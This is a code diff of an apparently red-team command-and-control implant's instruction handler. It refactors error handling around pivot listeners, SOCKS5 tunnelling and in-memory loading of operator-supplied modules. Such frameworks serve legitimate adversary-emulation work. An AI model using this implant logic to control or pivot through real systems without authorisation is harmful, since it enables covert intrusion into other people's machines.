@@ -451,6 +451,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		}
 
 		c2RetMessage.set_returnvalue(newSleepTimer);
+		return false;
 	}
 	//
 	// Beacon Listener cmd
@@ -463,7 +464,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		if(splitedCmd[0]==StartCmd)
 		{
-			if(splitedCmd[1]=="smb")
+			if(splitedCmd[1]==ListenerSmbType)
 			{
 				std::string pipeName = splitedCmd[2];
 
@@ -474,10 +475,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 				if(object!=m_listeners.end())
 				{
-					std::string msg = "Listener already exist";
-					// Respond the listener already exist
-					c2RetMessage.set_cmd("");
-					c2RetMessage.set_returnvalue(msg);
+					c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
+					return false;
 				}
 				else
 				{
@@ -488,9 +487,10 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 					// Respond with the listener hash
 					c2RetMessage.set_cmd(cmd);
 					c2RetMessage.set_returnvalue(listenerHash);
+					return false;
 				}
 			}
-			else if(splitedCmd[1]=="tcp")
+			else if(splitedCmd[1]==ListenerTcpType)
 			{
 				std::string localHost = splitedCmd[2];
 				int localPort;
@@ -500,9 +500,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 				}
 				catch (const std::invalid_argument& ia) 
 				{
-					std::string msg = "Error port format";
-					c2RetMessage.set_cmd("");
-					c2RetMessage.set_returnvalue(msg);
+					c2RetMessage.set_errorCode(ERROR_PORT_FORMAT);
+					return false;
 				}
 
 				std::vector<unique_ptr<Listener>>::iterator object = 
@@ -512,10 +511,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 				if(object!=m_listeners.end())
 				{
-					std::string msg = "Listener already exist";
-					// Respond the listener already exist
-					c2RetMessage.set_cmd("");
-					c2RetMessage.set_returnvalue(msg);
+					c2RetMessage.set_errorCode(ERROR_LISTENER_EXIST);
+					return false;
 				}
 				else
 				{
@@ -527,6 +524,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 					// Respond with the listener hash
 					c2RetMessage.set_cmd(cmd);
 					c2RetMessage.set_returnvalue(listenerHash);
+					return false;
 				}
 			}
 		}
@@ -539,17 +537,18 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 						[&](unique_ptr<Listener> & obj){ return obj->getListenerHash() == listenerHash;}
 						);
 
-			std::string msg = "hash not found";
 			if(object!=m_listeners.end())
 			{
 				m_listeners.erase(std::remove(m_listeners.begin(), m_listeners.end(), *object));
-				msg = listenerHash;
+				c2RetMessage.set_cmd(cmd);
+				c2RetMessage.set_returnvalue(listenerHash);
+				return false;
 			}
 			else 
-				cmd="";
-
-			c2RetMessage.set_cmd(cmd);
-			c2RetMessage.set_returnvalue(msg);
+			{
+				c2RetMessage.set_errorCode(ERROR_HASH_NOT_FOUND);
+				return false;
+			}
 		}
 	}
 	//
@@ -561,15 +560,18 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 		c2RetMessage.set_pid(c2Message.pid());
 
-		if(c2Message.cmd()=="start")
+		if(c2Message.cmd() == StartCmd)
 		{
+			return false;
 		}
-		else if(c2Message.cmd() == "stopSocks")
+		else if(c2Message.cmd() == StopCmd)
 		{
 			for(int i=0; i<m_socksTunnelClient.size(); i++)
 				m_socksTunnelClient[i].reset(nullptr);
+
+			return false;
 		}
-		else if(c2Message.cmd()=="init")
+		else if(c2Message.cmd() == InitCmd)
 		{
 			SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
 			std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
@@ -584,6 +586,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 				if(initResult)
 				{
 					m_socksTunnelClient.push_back(std::move(socksTunnelClient));
+					return false;
 				}
 				else
 				{
@@ -595,14 +598,14 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			}
 			catch (const std::invalid_argument& ia) 
 			{
-				SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
-				c2RetMessage.set_data("fail");
+				SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());				
+				c2RetMessage.set_errorCode(ERROR_GENERIC);
 				return false;
 			}
 
 			SPDLOG_DEBUG("Socks5 init Finished");
 		}
-		else if(c2Message.cmd()=="run")
+		else if(c2Message.cmd() == RunCmd)
 		{
 			SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());
 
@@ -629,7 +632,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 							SPDLOG_DEBUG("Socks5 run stop {}", c2Message.pid());
 
 							m_socksTunnelClient[i].reset(nullptr);
-							c2RetMessage.set_cmd("stop");
+							c2RetMessage.set_cmd(StopCmd);
 						}
 
 						SPDLOG_DEBUG("Socks5 run process finished {}", c2Message.pid());
@@ -641,7 +644,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 
 			SPDLOG_DEBUG("Socks5 run Finished");
 		}
-		else if(c2Message.cmd()=="stop")
+		else if(c2Message.cmd() == StopCmd)
 		{
 			SPDLOG_DEBUG("Socks5 stop {}", c2Message.pid());
 			for(int i=0; i<m_socksTunnelClient.size(); i++)
@@ -684,8 +687,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		handle = MemoryLoadLibrary((char*)buffer.data(), buffer.size());
 		if (handle == NULL)
 		{
-			std::string msg = "Error MemoryLoadLibrary";
-			c2RetMessage.set_returnvalue(msg);
+			c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
 			return false;
 		}
 
@@ -704,8 +706,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		construct = (constructProc)dlsym(handle, funcName.c_str());
 		if(construct == NULL) 
 		{
-			std::string msg = "Error MemoryGetProcAddress";
-			c2RetMessage.set_returnvalue(msg);
+			c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
 			return false;
 		}
 
@@ -716,10 +717,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
-		std::string msg = "Module loaded successfully:\n";
-		msg += inputfile;
-		// msg += m_moduleCmd.back()->getInfo();
-		c2RetMessage.set_returnvalue(msg);
+		c2RetMessage.set_returnvalue(CmdStatusSuccess);
+		return false;
 		
 #elif _WIN32
 
@@ -750,9 +749,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 			//Free the Win32's string's buffer.
 			LocalFree(messageBuffer);
 
-			std::string msg = "Error MemoryLoadLibrary: ";
-			msg+=message;
-			c2RetMessage.set_returnvalue(msg);
+			c2RetMessage.set_errorCode(ERROR_LOAD_LIBRARY);
 			return false;
 		}
 
@@ -762,8 +759,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		construct = (constructProc)MemoryGetProcAddress(handle, reinterpret_cast<LPCSTR>(0x01));
 		if (!construct != NULL) 
 		{
-			std::string msg = "Error MemoryGetProcAddress";
-			c2RetMessage.set_returnvalue(msg);
+			c2RetMessage.set_errorCode(ERROR_GET_PROC_ADDRESS);
 			return false;
 		}
     
@@ -772,10 +768,8 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		std::unique_ptr<ModuleCmd> moduleCmd_(moduleCmd);
 		m_moduleCmd.push_back(std::move(moduleCmd_));
 
-		std::string msg = "Module loaded successfully:\n";
-		msg += inputfile;
-		// msg += m_moduleCmd.back()->getInfo();
-		c2RetMessage.set_returnvalue(msg);
+		c2RetMessage.set_returnvalue(CmdStatusSuccess);
+		return false;
 
 #endif
 	}
@@ -784,7 +778,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		// TODO should be able to close the handle to the dll/so
 		// clean the memory
 		std::string moduleName = c2Message.cmd();
-		unsigned long moduleHash = djb2(moduleName);
+		unsigned long long moduleHash = djb2(moduleName);
 
 		std::vector<unique_ptr<ModuleCmd>>::iterator object = 
 			find_if(m_moduleCmd.begin(), m_moduleCmd.end(),
@@ -797,23 +791,24 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 					}
 					);
 
-		std::string msg = "module not found";
 		if(object!=m_moduleCmd.end())
 		{
 			m_moduleCmd.erase(std::remove(m_moduleCmd.begin(), m_moduleCmd.end(), *object));
-			msg = "Module ";
-			msg += moduleName;
-			msg += " removed.";
+			c2RetMessage.set_returnvalue(CmdStatusSuccess);
+			return false;
 		}
-
-		c2RetMessage.set_returnvalue(msg);
+		else
+		{
+			c2RetMessage.set_errorCode(ERROR_MODULE_NOT_FOUND);
+			return false;
+		}
 	}
 	//
 	// Command to be executed by a loaded module
 	//
 	else
 	{
-		unsigned long moduleHash = djb2(instruction);
+		unsigned long long moduleHash = djb2(instruction);
 
 		bool isModuleFound=false;
 		for(auto it = m_moduleCmd.begin() ; it != m_moduleCmd.end(); ++it )
@@ -826,10 +821,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		}
 		if(!isModuleFound)
 		{
-			std::string msg = "Module ";
-			msg+=instruction;
-			msg+=" not found.";
-			c2RetMessage.set_returnvalue(msg);
+			c2RetMessage.set_returnvalue(CmdStatusFail);
 		}
 	}
 
